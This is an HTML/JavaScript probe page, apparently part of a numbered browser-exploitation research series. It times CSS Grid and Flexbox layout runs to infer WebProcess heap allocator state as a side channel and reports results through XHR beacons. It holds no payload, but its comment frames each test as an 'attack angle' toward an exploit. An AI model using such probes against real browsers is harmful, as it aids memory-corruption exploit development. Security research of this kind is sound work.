@@ -1,0 +1,376 @@
+<!--
+  p715: CSS Grid/Flexbox layout engine internals leak
+
+  CSS Grid and Flexbox layout algorithms allocate internal data
+  structures (track sizing vectors, flex line arrays, grid placement
+  records) whose sizes depend on the grid/flex configuration. These
+  allocations go through WebProcess heap and their timing reveals
+  allocator state.
+
+  Key insight: Grid track sizing is O(tracks * items) and allocates
+  per-track data structures. A grid with 100 columns allocates
+  differently from one with 10 columns, and the allocation pattern
+  depends on which size class the data falls into. Timing the
+  layout for different grid configurations reveals page boundaries
+  in the allocator.
+
+  Attack angles:
+  A) Grid track sizing timing -- vary column/row count and measure
+     layout time. Non-linear steps reveal allocation boundaries.
+  B) Flexbox wrap timing -- flex-wrap with many items forces line
+     breaking. Line allocation timing depends on heap state.
+  C) Grid auto-placement timing -- auto-placed items trigger the
+     grid placement algorithm. Large grids with sparse items reveal
+     internal bitmap/vector allocation.
+  D) Subgrid feature detection -- subgrid may allocate shared track
+     sizing data between parent and child grids.
+  E) Grid template area naming -- named grid areas allocate string
+     intern entries. Many unique names may reveal intern table state.
+  F) Layout invalidation cascade -- changing one grid item forces
+     re-layout. The cost depends on which cached layout data is
+     invalidated and whether it crosses allocation boundaries.
+
+  CRASH_CLASS: LOW (CSS layout, no mutation of critical state)
+  prior art: p706 (CSS animation), p708 (SVG filter timing)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p715</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P715-START:GRID-FLEX-LAYOUT-LEAK');
+  var results = [];
+
+  // === SECTION A: Grid track sizing timing ===
+  b('A:GRID-TRACK-TIMING');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'position:absolute;left:-9999px;width:2000px;';
+    document.body.appendChild(container);
+
+    var colCounts = [2, 5, 10, 20, 50, 100];
+    var gridTimes = [];
+
+    for (var c = 0; c < colCounts.length; c++) {
+      var cols = colCounts[c];
+      var grid = document.createElement('div');
+      grid.style.cssText = 'display:grid;grid-template-columns:repeat(' + cols + ',1fr);gap:2px;';
+
+      // Fill with items (2 rows worth)
+      for (var i = 0; i < cols * 2; i++) {
+        var item = document.createElement('div');
+        item.style.cssText = 'min-height:20px;background:#ccc;';
+        item.textContent = 'I' + i;
+        grid.appendChild(item);
+      }
+      container.appendChild(grid);
+
+      // Measure layout
+      var t0 = performance.now();
+      for (var round = 0; round < 100; round++) {
+        grid.style.width = (500 + round % 2) + 'px';
+        grid.getBoundingClientRect();
+      }
+      var dt = performance.now() - t0;
+      gridTimes.push(cols + ':' + dt.toFixed(2));
+    }
+    b('A:GRID-TIMES:' + gridTimes.join(','));
+
+    // Check scaling -- should be roughly linear in columns
+    var times = gridTimes.map(function(t) { return parseFloat(t.split(':')[1]); });
+    for (var i = 1; i < times.length; i++) {
+      var colRatio = colCounts[i] / colCounts[i-1];
+      var timeRatio = times[i] / times[i-1];
+      if (timeRatio > colRatio * 2) {
+        b('A:STEP-AT-COLS=' + colCounts[i] + ',RATIO=' + timeRatio.toFixed(2));
+        results.push('A:grid-step=' + colCounts[i]);
+      }
+    }
+
+    document.body.removeChild(container);
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: Flexbox wrap timing ===
+  b('B:FLEX-WRAP-TIMING');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'position:absolute;left:-9999px;width:500px;';
+    document.body.appendChild(container);
+
+    var itemCounts = [10, 25, 50, 100, 200, 500];
+    var flexTimes = [];
+
+    for (var ic = 0; ic < itemCounts.length; ic++) {
+      var flex = document.createElement('div');
+      flex.style.cssText = 'display:flex;flex-wrap:wrap;';
+
+      for (var i = 0; i < itemCounts[ic]; i++) {
+        var item = document.createElement('span');
+        item.style.cssText = 'width:45px;height:20px;margin:1px;';
+        item.textContent = 'F';
+        flex.appendChild(item);
+      }
+      container.appendChild(flex);
+
+      var t0 = performance.now();
+      for (var round = 0; round < 50; round++) {
+        flex.style.width = (400 + round % 2) + 'px';
+        flex.getBoundingClientRect();
+      }
+      var dt = performance.now() - t0;
+      flexTimes.push(itemCounts[ic] + ':' + dt.toFixed(2));
+    }
+    b('B:FLEX-TIMES:' + flexTimes.join(','));
+
+    // Measure flex line count via children's offsetTop
+    var lastFlex = container.lastElementChild;
+    if (lastFlex && lastFlex.children.length > 0) {
+      var lines = new Set();
+      for (var i = 0; i < lastFlex.children.length; i++) {
+        lines.add(lastFlex.children[i].offsetTop);
+      }
+      b('B:LAST-FLEX-LINES=' + lines.size);
+    }
+
+    document.body.removeChild(container);
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: Grid auto-placement timing ===
+  b('C:AUTO-PLACEMENT');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'position:absolute;left:-9999px;width:1000px;';
+    document.body.appendChild(container);
+
+    // Sparse grid: few items in a large grid
+    var gridSizes = [10, 20, 50, 100];
+    var placeTimes = [];
+
+    for (var g = 0; g < gridSizes.length; g++) {
+      var size = gridSizes[g];
+      var grid = document.createElement('div');
+      grid.style.cssText = 'display:grid;grid-template-columns:repeat(' + size + ',1fr);grid-template-rows:repeat(' + size + ',20px);';
+
+      // Place items sparsely (every 7th cell)
+      for (var i = 0; i < size * size; i += 7) {
+        var item = document.createElement('div');
+        var row = Math.floor(i / size) + 1;
+        var col = (i % size) + 1;
+        item.style.cssText = 'grid-row:' + row + ';grid-column:' + col + ';background:#999;';
+        item.textContent = '.';
+        grid.appendChild(item);
+      }
+
+      // Also add auto-placed items (no explicit position)
+      for (var i = 0; i < 20; i++) {
+        var item = document.createElement('div');
+        item.style.cssText = 'background:#ddd;';
+        item.textContent = 'A';
+        grid.appendChild(item);
+      }
+
+      container.appendChild(grid);
+
+      var t0 = performance.now();
+      for (var round = 0; round < 20; round++) {
+        grid.style.gap = round % 2 === 0 ? '1px' : '2px';
+        grid.getBoundingClientRect();
+      }
+      var dt = performance.now() - t0;
+      placeTimes.push(size + 'x' + size + ':' + dt.toFixed(2));
+    }
+    b('C:PLACE-TIMES:' + placeTimes.join(','));
+
+    document.body.removeChild(container);
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: Subgrid feature detection ===
+  b('D:SUBGRID-DETECT');
+  try {
+    var testEl = document.createElement('div');
+    testEl.style.display = 'grid';
+    testEl.style.gridTemplateColumns = 'subgrid';
+    document.body.appendChild(testEl);
+
+    var cs = getComputedStyle(testEl);
+    var hasSubgrid = cs.gridTemplateColumns === 'subgrid';
+    b('D:SUBGRID-SUPPORTED=' + hasSubgrid);
+    if (hasSubgrid) results.push('D:subgrid');
+
+    // CSS.supports check
+    if (typeof CSS !== 'undefined' && typeof CSS.supports === 'function') {
+      b('D:CSS-SUPPORTS-SUBGRID=' + CSS.supports('grid-template-columns', 'subgrid'));
+      b('D:CSS-SUPPORTS-MASONRY=' + CSS.supports('grid-template-rows', 'masonry'));
+    }
+
+    document.body.removeChild(testEl);
+
+    // Check for other advanced grid features
+    var features = [
+      ['display', 'grid'],
+      ['display', 'inline-grid'],
+      ['grid-template-columns', 'repeat(auto-fill, minmax(100px, 1fr))'],
+      ['grid-template-columns', 'fit-content(200px)'],
+      ['grid-template-columns', 'minmax(min-content, max-content)'],
+      ['gap', '10px'],
+      ['row-gap', '10px'],
+      ['column-gap', '10px'],
+      ['place-items', 'center'],
+      ['place-content', 'center'],
+    ];
+
+    var supported = [];
+    for (var i = 0; i < features.length; i++) {
+      if (typeof CSS !== 'undefined' && CSS.supports) {
+        if (CSS.supports(features[i][0], features[i][1])) {
+          supported.push(features[i][0] + '=' + features[i][1]);
+        }
+      }
+    }
+    b('D:GRID-FEATURES:' + supported.join('|'));
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: Grid template area naming ===
+  b('E:TEMPLATE-AREA-NAMING');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'position:absolute;left:-9999px;width:500px;';
+    document.body.appendChild(container);
+
+    // Create grids with increasing numbers of named areas
+    var areaCounts = [4, 16, 36, 64, 100];
+    var areaTimes = [];
+
+    for (var ac = 0; ac < areaCounts.length; ac++) {
+      var count = areaCounts[ac];
+      var side = Math.sqrt(count);
+      var grid = document.createElement('div');
+
+      // Build template-areas string
+      var areas = '';
+      var names = [];
+      for (var row = 0; row < side; row++) {
+        var rowStr = '"';
+        for (var col = 0; col < side; col++) {
+          var name = 'area_r' + row + '_c' + col;
+          names.push(name);
+          rowStr += name + (col < side - 1 ? ' ' : '');
+        }
+        rowStr += '"';
+        areas += rowStr + ' ';
+      }
+
+      grid.style.cssText = 'display:grid;' +
+        'grid-template-columns:repeat(' + side + ',1fr);' +
+        'grid-template-rows:repeat(' + side + ',20px);' +
+        'grid-template-areas:' + areas + ';';
+
+      // Place items in named areas
+      for (var i = 0; i < names.length; i++) {
+        var item = document.createElement('div');
+        item.style.gridArea = names[i];
+        item.textContent = '.';
+        grid.appendChild(item);
+      }
+
+      container.appendChild(grid);
+
+      var t0 = performance.now();
+      for (var round = 0; round < 50; round++) {
+        grid.style.width = (400 + round % 2) + 'px';
+        grid.getBoundingClientRect();
+      }
+      var dt = performance.now() - t0;
+      areaTimes.push(count + ':' + dt.toFixed(2));
+    }
+    b('E:AREA-TIMES:' + areaTimes.join(','));
+
+    document.body.removeChild(container);
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SECTION F: Layout invalidation cascade ===
+  b('F:INVALIDATION-CASCADE');
+  try {
+    var container = document.createElement('div');
+    container.style.cssText = 'position:absolute;left:-9999px;width:800px;';
+    document.body.appendChild(container);
+
+    // Nested grid inside flexbox inside grid
+    var outerGrid = document.createElement('div');
+    outerGrid.style.cssText = 'display:grid;grid-template-columns:1fr 1fr;gap:4px;';
+
+    for (var col = 0; col < 2; col++) {
+      var flex = document.createElement('div');
+      flex.style.cssText = 'display:flex;flex-wrap:wrap;';
+
+      for (var f = 0; f < 10; f++) {
+        var innerGrid = document.createElement('div');
+        innerGrid.style.cssText = 'display:grid;grid-template-columns:repeat(3,1fr);width:120px;';
+        for (var g = 0; g < 9; g++) {
+          var cell = document.createElement('div');
+          cell.style.cssText = 'min-height:15px;';
+          cell.textContent = col + '.' + f + '.' + g;
+          innerGrid.appendChild(cell);
+        }
+        flex.appendChild(innerGrid);
+      }
+      outerGrid.appendChild(flex);
+    }
+    container.appendChild(outerGrid);
+    outerGrid.getBoundingClientRect(); // initial layout
+
+    // Measure cost of changing a deeply nested element
+    var deepCell = outerGrid.querySelector('div div div div');
+    var cascadeTimes = [];
+
+    for (var round = 0; round < 20; round++) {
+      deepCell.textContent = 'Changed content round ' + round + ' with more text';
+      var t0 = performance.now();
+      outerGrid.getBoundingClientRect();
+      var dt = performance.now() - t0;
+      cascadeTimes.push(dt.toFixed(3));
+    }
+    b('F:CASCADE-TIMES:' + cascadeTimes.join(','));
+
+    // Compare: changing outer grid directly
+    var outerTimes = [];
+    for (var round = 0; round < 20; round++) {
+      outerGrid.style.gap = (4 + round % 2) + 'px';
+      var t0 = performance.now();
+      outerGrid.getBoundingClientRect();
+      var dt = performance.now() - t0;
+      outerTimes.push(dt.toFixed(3));
+    }
+    b('F:OUTER-TIMES:' + outerTimes.join(','));
+
+    var avgCascade = cascadeTimes.reduce(function(a,b){return a+parseFloat(b)},0) / cascadeTimes.length;
+    var avgOuter = outerTimes.reduce(function(a,b){return a+parseFloat(b)},0) / outerTimes.length;
+    b('F:AVG-CASCADE=' + avgCascade.toFixed(3) + ',AVG-OUTER=' + avgOuter.toFixed(3));
+
+    document.body.removeChild(container);
+  } catch(e) {
+    b('F:ERR:' + e.message);
+  }
+
+  // === RESULTS ===
+  if (results.length > 0) {
+    b('P715-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P715-RESULT:NO-LEAK-DETECTED');
+  }
+  b('P715-DONE');
+}
+
+setTimeout(main, 200);
+</script>
+</head><body style="margin:0"><pre id="log">p715: CSS Grid/Flexbox layout engine internals leak</pre></body></html>
